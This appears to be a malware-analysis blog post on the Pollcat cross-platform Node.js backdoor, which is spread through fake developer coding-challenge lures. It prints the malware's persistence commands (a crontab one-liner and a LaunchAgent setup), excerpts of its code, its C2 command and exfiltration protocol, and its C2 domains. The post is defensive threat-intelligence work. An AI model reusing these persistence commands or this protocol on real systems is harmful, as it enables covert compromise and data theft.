---
title: "Mirage kitten tricking victims with code-challenge lures"
date: 2026-09-09 22:00:30 +0300
categories: [malware analysis, Threat Intelligence] 
tags: [tracking,malware]
---

Recently , some people where recieving emails from unkown entities , impersonating talent acquisition specialist at a major technology company , looking for telented programmers . The sent lures were a **coding** based challenges , challenging the victim to complete a certain set of **problem solving** and **bug fixing** tasks . Those challenges usually posed time constraints (**You should complete the challenge in X amount of time**) , stirring a sense of urgency .

According to  [Kaspersky](https://securelist.com/mirage-kitten-new-backdoors-noderabbit-pollcat/121244/) , this behavior was attributed to  the iranian **APT** Mirage kitten ( also tracked as **UNC1549** , **Nimbus Manticore** and **Smoke Sandstorm** ) . Those phishing lures targeted fintech, aviation and aerospace sectors across the Middle East and Africa – specifically, in Egypt, Ethiopia and Afghanistan . 

These regional interests alligns with the **group** common regional targets . Also , the social engineering theme , fake job posts and talent acquiring lures , alligns perfectly with the group's common social engineering tactics . 

Publicly , two major phishing lures were observed . The **first** being a challenge called **Taskflow - frontend engineering challenge**  , an app for software engineering assessment built with Express, React, and Vite. The accompanying README instructed the candidate to review the application and fix defects in its frontend . **Imposing a three hour limit to finish the task** , and guiding to not touch **server.js** , claiming to be the only component that is already fixed .It also instructed them to not use an AI assistant (**which would figure out that this is a malware lure**) . 

The developers would go on completing the tasks , not knowing that  **server.js** is a stealth , Obfuscated **node.js** backdoor  , dubbed **Node Rabbit** .


The **Second** being a challenge called **Rank-Challenge-react**  "**10 progressive React challenges - from JSX and props to hooks and data fetching . Each level unlocks the next and adds to your score, ranking you against other developers**" . 

The latter one being also trojanized , deliviring a new , cross platform **node.js** backdoor dubbed **Pollcat** .

This **Mirage kitten** campaign shows a shift away from  the usual  **compiled backdoors** written in C/C++ or Go , to a  **scripting** based backdoor , which is compatible among all platforms - Windows , Linux and Macos .


**In this technical write-up , we will be focusing the the second malware , Pollcat , deeply analyzing the phishing lure , as well as the malware itself , with it's TTPs** .




## Yeah , this is a coding challenge , isn't it ? 
 
The victim is delivered with  a zip archive ```RankChallenge-react.zip``` . The archive contains a .pdf file ```Tutorial.pdf``` , which contains a detailed explanation of the challenge , rules , it's levels  and a tutorial to install **node.js** if not already installed .

The challenge imposes **one hour** time limit to complete all levels (**which is just a way to hint urgency to the victim ,  pushing them to react without much thinking**).

To start the challenge , the guide tells them to run ```npm start``` , which will trigger the malware execution chain .


Upon executing the above command , the challenge will open automatically in the victims browser :

![Lure main Page](/resources/Pollcat_rsrcs/main_pago.png)


By now , the following execution chain have occured : 

```index.js``` will launch ```./serverWorker.js``` , which in turn launches ```./app.js``` . Now , ```./app.js``` will run ```./middleware/requireAuth.js``` (which is the trojanized module , that starts the malware infection ). 


Now , ```./middleware/requireAuth.js``` will just  launch ```./middleware/requesthandler.js``` , which will achieve persistence for the main **Pollcat** module ```./middleware/requireObject.js``` in a cross platform way :

**On windows :**

```
1.It will move ./middleware/requireObject.js with  packages.json (it's required packages and dependencies)

2.It will register a scheduled task that runs every day on 9:00 AM , with name 
"Name : NetSync_username(of the userprofile)"
and description "Network sync job" , which runs the Pollcat backdoor

3.This is done using ITaskService COM instance

```

**Note: Just In windows , the requesthandler.js will launch another side-by-side module  responsehandler.js  , which is the one using ITaskService For task creation .**


**On linux :**
```
1.Move requireobject.js and packages.json to $HOME

2.Maintain  persistence using crontab , with the following command :

(crontab -l 2>/dev/null; echo \"0 9 * * * /usr/bin/node " + $HOME + "/requireObject.js\"; echo \"@reboot sleep 60 && [ \\$(date +\\%H) -ge 9 ] && /usr/bin/node " + _0x57ca15 + "/requireObject.js\") | crontab -

which will run requireobject.js every day at 9:00 AM using node.exe

```

**On macos :**

```
Maintain persistence using a LaunchAgent

1./home/Library/LaunchAgents/com.harsh.requireobject.plist is the path to the LaunchAgent persistence setup

2.It has the following settings :

Label:com.harsh.requireobject
RunAtLoad : true
Arguments: /bin/node $HOME/.node_packages/requireObject.js
StartCalendarInterval : every day at 9:00 am
StandardOutPath: /tmp/com.harsh.requireobject.err

which will Also run requireobject.js every day at 9:00 AM using node.exe

```

Finally , ```./middleware/requireAuth.js``` will import and exeucte ```./middleware/requireObject.js``` (the main **Pollcat** module).


Now , if we revisite the main page , when the developer click **Continue** to enter the challenge , they are first faced with an **OTP** authentication . 

![Lure OTP authentication](/resources/Pollcat_rsrcs/OTP_auth.png)


The **OTP** is a random one given by the **Threat Actor** to the victim , which will expire every 30 secs .

Investigating the backend , the authentication process will validate the **OTP** to a custom C2 **Endpoint** ```https://lifespotify.com/api/users/b879746e-fed9-4211-a6da-4d8223681267/validate``` . The domain and the GUID are stored under ```.\.env``` :

```
JWT_SECRET=ctf-jwt-secret-change-this-in-production-2026
OTP_SERVICE_URL=https://lifespotify.com
OTP_CLIENT_ID=b879746e-fed9-4211-a6da-4d8223681267
```

The key takeaway is , whether the authentication worked or not , the **Pollcat** malware will run eventually (as mentioned in the execution chain above) . Additionally , if authentication worked , another instance of **Pollcat** will be ran .

As a side-note , the new instance file name is ```./middleware/requireobjects.js``` (Notice the S in objects) , which is just a copy of the main **Pollcat** module .

![Pollcate copies](/resources/Pollcat_rsrcs/the_copies.png)


The question that is raised now , if the main malware already ran , why the additional **OTP** authentication process ? 

This maneuver is purely for phsycological effect . The victim will feel that the challenge is legitimate , and customized to him/her , since **OTP** will only be granted by the **Threat Actor** , bolstering the social-engineering lure .


![full_execution_chain](/resources/Pollcat_rsrcs/execution_chain.png)



## Pollcat , A cross platform backdoor 

Before doing anything  , **Pollcat** checks the environment for ```_BG_``` , checking if it is already running or not . If only one instance is running  , it will re-spawn itself  ```hidden``` and ```unreferenced``` from the parent process .

This is done so , even if the **OTP** authentication that will launch the second instance fails , the second instance is ensured to run , speeding-up the operations . 


Now , the ```_mainloop``` function will run .

```JS
 async ["_mainLoop"]() { //main loop
    while (this._running) {
      try {
        this._resetUrlIndex();
        const FBeaconSuccess = await this._registerWithServer(); //send beacon 
        if (FBeaconSuccess) {
          await this._pollingLoop();
        }
      } catch (_0x14b3a7) {}
      if (this._running) {
        await this._interruptibleSleep(2000);
      }
    }
  }
```

In this function , **Pollcat** will continuously send beacons to the **C2** .

The beacon is sent to ```c2_url/beacon``` using **POST** request , with the following data :

```
{"clientId":"129--devicehostname","type":"poll","pcName":"devicehostname","userName":"username"}
```

**Pollcat** have a main C2  , and two fallback :

```
https://sahi-finance.com

https://GamebarAppinformation.azurewebsites.net 

https://GamebarApp.azurewebsites.net
```

**Pollcat** will circulate through these urls , so if one fails , it will use the others .

This increases operational reseliency , so if one **C2** is taken-down  , others may still be functioning , ensuring prolonged impact and access .


Upon beacon failure , **Pollcat** will delay execution for **one second** , then resend beacon again .

Upon beacon success , **Pollcat** will recieve the following JSON data : 

```
{
    _socketId:token,
    _timing.pollInterval:poll-interval,
    _timing._timing.jitterTime:jitter-time
}
```

The ```socketId``` is very important , as it will be used as an **API** authentication token in the exfiltration later on . Ensuring that only infected endpoints can submit data .

The ```poll-interval``` and ```jitter-time``` fields are used to customize the respective parameters in the backdoor . The default ```poll-interval``` is ```120``` secs and The default ```jitter-time``` is ```5``` . 

So , if the attacker later during **discovery** found a high-priority victim , they can decrease the **poll-interval** to collect data and cause impact  faster .


Now , if we step-back to the ```_mainloop``` , we will notice that after ```_registerWithServer``` , ```_pollingLoop``` will be called . 


In the Polling loop , **Pollcat** will first fetch commands from the **C2** . It will do that by ```GET c2_url/gate/fetch?token=socket_id_passed``` .

Upon failure , **Pollcat** will suspend execution for ``3 secs`` then will retry fetching . 

Upon success , **Pollcat** will recieve a collection of commands , in the following form :

```
base64(CountOfCommandContained || [length_of_command_container || command_container] repeated CountOfCommandsContained times  )
```

Now , the ```command_container``` is structered as follows :

```
base64( first-four-bytes-unused  || embedded Command.arg length || embedded Command.File length || One byte Command Opcode || Command.args || Command.File ) 

```

**Pollcat** will extract all  ```Command.Arg``` (which is the command body to execute) and ```Command.File``` (which is the file path for fileoperation commands) and ```Opcode``` (which is used in the command-dispatcher ahead).

<br><br>

Now, the final  section is ```_dispatchCommand``` function , which will execute every command passed in the command list based on the passed **Opcode** .


**For commands that have execution results** , ```_submitResult``` is called . This function will exfiltrate command-execution resuls to the **C2** , using ```POST  c2_url/gate/submit``` , with the following JSON data : 

```
{
'token': this._socketId,
'result': base64(passed-command-result)
    }
```

### Pollcat Command List 

| Opcode        | Command name               | Description                                                                                                   | Result if success                                                                                                                                                                                                                 |
| ------------- | -------------------------- | ------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`0x4`**     | `GetSystemInfo`            | Collect system information, such as domain name, OS version/release, CPU information, and memory information. | `type=system&data=<collected data>`<br>**`data` is URL-encoded**                                                                                                                                                                  |
|               | `GetUsers`                 | Account discovery; cross-platform collection of users and their groups.                                       | `type=users&data=<collected data>`<br>**`data` is URL-encoded**                                                                                                                                                                   |
|               | `localGroups`              | Execute `net local group` to discover groups on Windows.                                                      | `type=groups&data=<collected data>`<br>**`data` is URL-encoded**                                                                                                                                                                  |
|               | `default`                  | Execute the passed command using `cmd.exe` or `/bin/sh` according to the platform.                            | For `ipconfig`, `netstat`, `route`, `arp`, `netsh`, `net start`:<br>`type=network&data=<execution result>`<br>**`data` is URL-encoded**<br><br>Otherwise:<br>`type=terminal&data=<execution result>`<br>**`data` is URL-encoded** |
| **`0xf`**     | `ExecutePassedCommand`     | Execute the passed command.                                                                                   | `type=terminal&data=<execution result>`<br>**`data` is URL-encoded**                                                                                                                                                              |
| **`0x5`**     | `getProcesses`             | Process discovery; cross-platform.                                                                            | `type=processes&data=<collected processes and their users>`<br>**`data` is URL-encoded**                                                                                                                                          |
| **`0x2`**     | `listFiles`                | List all files and directories in the passed `Command.File`.                                                  | `type=files&data=<collected data>`<br>**`data` is URL-encoded**                                                                                                                                                                   |
| **`0x6`**     | `deleteFile`               | Delete the file/directory at the passed `Command.arg`.                                                        | —                                                                                                                                                                                                                                 |
| **`0x3`**     | `MoveFiles`                | Move files/directories from source to destination.                                                            | —                                                                                                                                                                                                                                 |
| **`0xc`**     | `CreateDirs`               | Create a directory at the passed path.                                                                        | —                                                                                                                                                                                                                                 |
| **`0xd`**     | `Zip/Unzip`                | ZIP files at the staging location or unzip an archive at the passed path using `ADM-ZIP`.                     | —                                                                                                                                                                                                                                 |
| **`0x9`**     | `DriveEnum`                | Enumerate all mounted drives; cross-platform.                                                                 | —                                                                                                                                                                                                                                 |
| **`0x10`**    | `killProcess`              | Kill the process with the passed process ID; cross-platform.                                                  | —                                                                                                                                                                                                                                 |
| **`0x7`**     | `IngressToolTransfer`      | Drop the file from `c2url/vault/Commands.File` to the location specified in `Commands.arg`.                   | —                                                                                                                                                                                                                                 |
| **`0xe`**     | `chunkedExfiltration`      | Exfiltrate the specified file to the C2 in chunks.                                                            | —                                                                                                                                                                                                                                 |
| **`0xb`**     | `Rundll`                   | Use `rundll32` to run the passed DLL and call the specified export.                                           | —                                                                                                                                                                                                                                 |
| **`0xf0`**    | `ChangeTimes1`             | Change `sleepTime` and `PolInterval` for the backdoor.                                                        | —                                                                                                                                                                                                                                 |
| **`0xf1`**    | `ChangeTimes2`             | Change `idleTime` for the backdoor.                                                                           | —                                                                                                                                                                                                                                 |
| **`0xf2`**    | `ChangeTimes3`             | Change `JiterTime` for the backdoor.                                                                          | —                                                                                                                                                                                                                                 |
| **`0x30`**    | `SecurityAndMailDiscovery` | List files/directories of certain security vendors and Outlook `.ost` file locations.                         | —                                                                                                                                                                                                                                 |
| **`0x20`**    | `InMemoryJsExecution`      | Execute received JavaScript in memory.                                                                        | `type=code&data=<JS execution data>`<br>**`data` is URL-encoded**                                                                                                                                                                 |
| **`default`** | `Error`                    | Handle an unknown opcode.                                                                                     | `error: unknown opcode <passed opcode>`                                                                                                                                                                                           |



In  ```chunkedExfiltration``` command , the command follows the following form : 

```
filepath to exfiltrate || chunkCount || Wait interval || chunksize optional 1 || chunksize optional 2

```

As the name suggests , this command exfiltrates a file  chunk by chunk . Chunk size is either derived from  **filesize/ChunkCount** or specified in one of the **chunksize optional** fields . If none of that is specified , it defaults to ```2097152``` byte .

Each file chunk will by  exfiltrated by ```PUT c2_url/vault/push/``` , with chunk data as raw bytes . 

Each Sent chunk data is tracked under different endpoint ```c2_url/gate/track``` 

The tracking data includes :

```
'token': this._socketId,
'chunkIndex': ChunkIndex,
'bytes': CurrentChunkLength,
'path': FilePath
```

This is a  chunked, scheduled exfiltration , ensuring that malware traffic will blend in with normal system activity , and do not cause sudden network traffic spikes .
<br><br>

In ```SecurityAndMailDiscovery``` , It will first execute ```getProcesses``` command to get a list of system processes .

Next , it will list files and dirs in ```Program Files Program Files (x86) LocalAppData  AppData UserProfile```

Most importantly , it does **security vendor discovery** , it will look for the following **security products** and **browsers** : 

```
["Google", "Microsoft", "Palo Alto Networks", "Cisco", "VMware", 'Fortinet', "Citrix", 'CheckPoint', "Juniper Networks", "LogMeIn", 'Sophos', 'Symantec', "Trend Micro", "McAfee", "Kaspersky Lab", 'ESET', "Bitdefender", "Avast Software", "CrowdStrike", "SentinelOne", "Malwarebytes", "BraveSoftware", "Tencent", "Naver"]
```
For each found vendor , it will list all files and directories of that vendor . 

By this , **Pollcat**  aims to understand system security posture , possibly shaping on follow-up behaviors and delivered payloads .


Finally , in an Espionage looking move , **Pollcat** searches for  **Outlook** files   ,especially **outlookOst** and **outlookOlk** , which hold an offline copy of all emails .

Coupled with it's exfiltration capabilities , **Pollcat** can steal all emails from local device , aiding in it's espionage goals .

Collected file and process listings are exfiltrated to the **C2** by ```POST c2_url/api/system-details/result``` , with the following data exfiltrated : 

```
{
'checkId': recieved_from_c2
'rawData': {
            'processes': CollectedProcesses,
            'directories': _0x2fddbe, //collected dirs and their file listing
            'allPaths': _0x5e0927 //absolute paths to collected listing
            }
}
```



The **Final** command of interest is ```InMemoryJsExecution``` . This command shows a clear intent of adversarial **Defense Evasion** . In this command , **Pollcat**  will recieve a JavaScript payload , but instead of dropping it on disk , it favors In-memory execution , leaving minimal amount of **IOCs** on disks .


## Infrastructure :

| Domain                                    | Registrar        | ASN       | Description                       |
| ----------------------------------------- | ---------------- | --------- | --------------------------------- |
| `sahi-finance.com`                        | NameCheap, Inc.  | `AS13335` | Main C2 for Pollcat Backdoor      |
| `GamebarAppinformation.azurewebsites.net` | MarkMonitor Inc. | —         | Fallback C2                       |
| `GamebarApp.azurewebsites.net`            | MarkMonitor Inc. | —         | Fallback C2                       |
| `lifespotify.com`                         | Dynadot Inc.     | `AS13335` | Used for Rogue OTP authentication |


## File hashes

Tutorial.pdf        ```097b7c6b385f6f29a68e57c1433910512f10b7fe5bc6aa95b0376fc7cf66d34b```

requestHandler.js      ```7f6e77d87e0271eb4eb9b638ee59249c796a137eaa57e32d81a9ab17529ae05c```

requireAuth.js        ```d6f41746c80496797339bd6a2285f15a43e02116c550990ddc41a7536c235828```

requireObject.js        ```693f4db3eccbf4034cae224911f66c316bde45e0d8a397f1033b0978a8ecde5c```

requireObjects.js      ```8c2d2144033ed5bee4dc3359e4cbf7e97917c57fbddaa1c3cf848ac15e2da6e7```

<br><br>
**And by that , we wrap our write-up , see you on the next one** :)